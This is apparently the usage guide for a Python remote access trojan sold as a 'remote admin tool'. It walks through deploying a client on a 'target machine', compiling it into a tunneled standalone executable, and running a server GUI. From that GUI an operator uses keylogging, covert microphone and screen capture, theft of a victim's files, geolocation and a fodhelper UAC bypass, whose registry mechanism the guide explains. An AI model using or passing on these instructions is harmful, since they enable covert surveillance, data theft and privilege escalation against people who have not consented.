# 📖 Complete Usage Guide — Step by Step

## 🎯 Table of Contents
- [Windows Setup](#-windows-setup)
- [Linux Setup](#-linux-setup)
- [Using GUI Server](#-using-gui-server)
- [Advanced Features](#-advanced-features)
- [Common Commands](#-common-commands)
- [Troubleshooting](#-troubleshooting)

---

## 🪟 Windows Setup

### Step 1: Install Python

1. Download Python from [python.org](https://www.python.org/downloads/)
2. Run the installer
3. ✅ **IMPORTANT**: Check "Add Python to PATH"
4. Click "Install Now"
5. Verify installation:
   ```cmd
   python --version
   ```
   Should show: `Python 3.x.x`

### Step 2: Download the Tool

**Option A: Using Git**
```cmd
git clone https://github.com/palnirupam/Remote-admin-tool.git
cd Remote-admin-tool
```

**Option B: Download ZIP**
1. Go to: https://github.com/palnirupam/Remote-admin-tool
2. Click "Code" → "Download ZIP"
3. Extract the ZIP file
4. Open Command Prompt in that folder

### Step 3: Install Dependencies

```cmd
pip install -r requirements.txt
```

### Step 4: Configure Firewall

Open Command Prompt as Administrator:
```cmd
netsh advfirewall firewall add rule name="Remote Admin Tool" dir=in action=allow protocol=TCP localport=5000
```

### Step 5: Configure Client IP

1. Open `client.py` in Notepad
2. Find and edit:
   ```python
   SERVER_IP = "127.0.0.1"   # Change this to your server IP
   PORT = 5000
   ```
3. Save the file

### Step 6: Find Your Server IP

```cmd
ipconfig
```
Look for "IPv4 Address" (e.g., `192.168.1.100`)

### Step 7: Run the Server

```cmd
python server_gui.py
```
Then click **"🚀 Start Server"** button.

### Step 8: Run the Client

```cmd
python client.py
```
You should see: `✓ Connected to server`

---

## 🐧 Linux Setup

### Step 1: Install Python

**Ubuntu/Debian:**
```bash
sudo apt update && sudo apt install python3 python3-pip
```

**Fedora/RHEL:**
```bash
sudo dnf install python3 python3-pip
```

**Kali Linux:**
```bash
sudo apt install python3 python3-pip python3-tk
```

### Step 2: Clone & Install

```bash
git clone https://github.com/palnirupam/Remote-admin-tool.git
cd Remote-admin-tool
pip3 install -r requirements.txt
```

### Step 3: Allow Firewall Port

**UFW:**
```bash
sudo ufw allow 5000/tcp
```

**iptables:**
```bash
sudo iptables -A INPUT -p tcp --dport 5000 -j ACCEPT
```

### Step 4: Run

```bash
python3 server_gui.py    # Server
python3 client.py        # Client (on target machine)
```

---

## 🛠️ Building Standalone Executable

Compile `client.py` → standalone `.exe` (Windows) or binary (Linux).
No Python needed on the target machine.

```bash
python advanced_build.py
```

- Automatically downloads `bore` tunnel (FREE, no account needed)
- Injects public IP:Port into the compiled binary
- Output: `dist/ClientRAT_Global.exe`

---

## 🎨 Using GUI Server

### Starting

```bash
python server_gui.py      # Windows
python3 server_gui.py     # Linux
```

### Step-by-Step

#### 1. Start the Server
- Click **"🚀 Start Server"** (top right)
- Status changes to `✓ Server Running` (green)

#### 2. Connect Clients
- Run `python client.py` on each target machine
- Clients appear automatically in the **"CONNECTED CLIENTS"** panel

#### 3. Select a Client
- Click on any client in the list
- All command buttons become enabled

#### 4. Execute Commands
- **Method 1:** Click any button (e.g., "📸 Screenshot")
- **Method 2:** Type directly in the terminal area + press `Enter`

#### 5. Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `↑` `↓` | Navigate command history |
| `Ctrl+L` | Clear terminal |
| `Ctrl+C` | Copy / Clear input |
| `Ctrl+V` | Paste |

---

## 🔥 Advanced Features

### 🗺️ GeoLocation Tracker

**Button:** `🗺️ GeoLocation`

1. Select a connected client
2. Click **"🗺️ GeoLocation"**
3. Window opens showing:
   - 🌍 Country, Region, City, ZIP
   - 📍 GPS Coordinates
   - 📡 ISP & Organization
   - 🔒 VPN/Proxy/Datacenter detection
   - 🕐 Timezone

4. Click **"🗺️ Open in Google Maps"** to view location
5. Click **"📋 Copy Coords"** to copy latitude/longitude

> **Note:** If client is behind VPN, location will show VPN server location, not real location.

---

### 👑 Privilege Inspector + UAC Bypass

**Button:** `👑 Privilege`

1. Select a connected client
2. Click **"👑 Privilege"**
3. Window shows:

```
👤 Username      → Who is logged in
🛡️ Admin Group   → Is user in Administrators group?
🔒 UAC Enabled   → Is UAC turned on?
🔑 Integrity     → Low / Medium / High / System
⚡ Elevated       → Is process already elevated?
```

**Integrity Level Meanings:**

| Badge | Level | What it means |
|-------|-------|---------------|
| 🔴 | Low | Restricted / sandbox |
| 🟡 | Medium | Standard session (UAC active) |
| 🟢 | High | Full admin access |
| 🔵 | System | NT AUTHORITY\SYSTEM |

#### UAC Bypass (fodhelper method)

If the client shows:
- `Admin Group: Yes ✅`
- `Integrity: 🟡 Medium`
- `Elevated: No`

→ The **"🔥 Execute UAC Bypass (fodhelper)"** button will appear.

**How it works:**
1. Writes payload path to `HKCU\Software\Classes\ms-settings\shell\open\command`
2. Triggers `fodhelper.exe` (Windows auto-elevated binary)
3. Client relaunches at **HIGH integrity** — no UAC popup shown
4. New HIGH connection appears in client list

> **Requires:** Client user must be in the Administrators group. Standard users cannot be bypassed this way.

---

### 🖥️ Live Screen Monitor

**Button:** `🖥️ Screen Stream`

- Streams remote desktop in real-time
- **Click** anywhere on the stream → sends click to remote
- **Scroll** mouse wheel → scrolls on remote
- **Drag** → drag-and-drop on remote

**Keyboard Hotkeys (forwarded to remote):**

| Key | Action |
|-----|--------|
| `Ctrl+C` | Copy |
| `Ctrl+V` | Paste |
| `Ctrl+Z` | Undo |
| `Ctrl+A` | Select All |
| `Ctrl+S` | Save |
| `Ctrl+X` | Cut |
| `Ctrl+W` | Close tab |
| `Ctrl+T` | New tab |
| `Ctrl+R` | Refresh |

---

### 📁 Visual File Manager

**Button:** `📁 File Manager`

1. Click **"💻 Drives"** to list all drives
2. Double-click any drive/folder to navigate
3. Right-click on a file to:
   - 📥 **Download** — save to your machine
   - ✏️ **Edit** — open in remote text editor
   - 🗑️ **Delete** — permanently delete

> Works on both Windows (`C:\`) and Linux (`/home/`) paths.

---

### 📸 Screenshot

**Button:** `📸 Screenshot`

1. Click the button
2. Screenshot window opens automatically
3. Options:
   - **💾 Save 4K** — save at original resolution
   - **🔍 100% Size** — view at actual size

---

### 🎤 Microphone Recording

**Button:** `🎤 Microphone`

1. Click to **start** recording (button turns red)
2. Click **"⏹ Stop Mic"** to end
3. Save dialog appears → choose WAV or MP3

---

### ⌨️ Keylogger

**Button:** `⌨️ Keylog`

1. Click to **start** capture
2. Keystrokes appear in the terminal in real-time (green text)
3. Click **"⏹ Stop Keylog"** to end
4. Auto-saved to `keylogs/` with timestamp

---

### 💬 Send Popup

**Button:** `💬 Send Popup`

Types available:
- `INFO` — standard message box
- `WARNING` — warning with ⚠️ sound
- `ERROR` — error dialog
- `CYBER` — cyberpunk HUD overlay
- `OVERRIDE` — fullscreen siren (red, loud)

---

### 🎯 Task Manager

**Button:** `🎯 Task Manager`

- View all running processes (name, PID, CPU%, RAM)
- Click any process → **Kill** it remotely

---

### 📊 Performance Dashboard

**Button:** `📈 Dashboard`

Real-time graphs:
- CPU usage %
- RAM usage %
- Disk I/O

---

### 📥 Download File

**Button:** `📥 Download`

1. Enter full path on client:
   - Windows: `C:\Users\victim\secret.txt`
   - Linux: `/home/user/document.pdf`
2. Choose save location on your machine
3. File downloads to `downloads/` folder

---

### 📤 Upload File

**Button:** `📤 Upload`

1. Click and select file from your machine
2. File uploads to client's current directory

---

### ⚙️ System Control

| Button | Action |
|--------|--------|
| 🔄 Restart System | Instantly restarts client PC |
| ⏻ Shutdown System | Instantly shuts down client PC |
| 🔒 Lock Workstation | Locks the screen (Windows) |

---

## 📝 Common Commands

### Windows

```cmd
ipconfig                    # Network info
whoami                      # Current user
whoami /groups              # Show group memberships + integrity
systeminfo                  # Full system info
tasklist                    # Running processes
netstat -an                 # Network connections
dir C:\Users                # List files
cd C:\Users\victim          # Change directory
```

### Linux

```bash
ifconfig / ip addr          # Network info
whoami                      # Current user
id                          # UID, GID, groups
uname -a                    # Kernel + OS info
ps aux                      # Running processes
netstat -tuln               # Open ports
ls -la /home/user           # List files
```

---

## 🔧 Troubleshooting

### ❌ Client Can't Connect

```
✅ Is server running? python server_gui.py → Start Server
✅ Is SERVER_IP correct in client.py?
✅ Is port 5000 open on firewall?
✅ Ping test: ping <server_ip>
```

### ❌ Port Already in Use

```powershell
# Windows
netstat -ano | findstr :5000
taskkill /PID <pid> /F
```
```bash
# Linux
lsof -i :5000
kill -9 <pid>
```

### ❌ GeoLocation Fails

- Check internet connection on server machine
- VPN on server may cause issues with api.ipify.org
- Private/localhost clients auto-resolve their public IP

### ❌ UAC Bypass Not Working

```
✅ Is client on Windows? (Linux has no UAC)
✅ Is user in Administrators group? (is_admin: true required)
✅ Is UAC enabled? (if UAC=OFF, already elevated — no bypass needed)
❌ Standard user (is_admin: false) → bypass impossible without prior exploit
```

### ❌ File Manager Empty

- File manager now uses string-based path normalization
- If still empty: restart client and try again
- Check client terminal for errors

### ❌ Screenshot Not Working

```bash
pip install pillow mss
```

### ❌ GUI Not Opening

```bash
# Linux
sudo apt install python3-tk
```

---

## 🎓 Tips & Best Practices

1. **Test locally first** using `127.0.0.1` before deploying remotely
2. **Check Activity Log** (right panel) for real-time status messages
3. **Restart client after bug fixes** — old client.py won't have new features
4. **Use Tab** in terminal for command auto-complete
5. **For UAC bypass test** — create a separate Windows Admin account and test with that

---

## 📞 Getting Help

1. **Check this guide** first
2. **Review server.log** for errors  
3. **GitHub Issues**: https://github.com/palnirupam/Remote-admin-tool/issues
4. **Open new issue** with:
   - Your OS and Python version
   - Error message (screenshot preferred)
   - Steps to reproduce

---

<div align="center">

**Happy Hacking! 🔥**

Made with ❤️ by [Nirupam Pal](https://github.com/palnirupam)

</div>
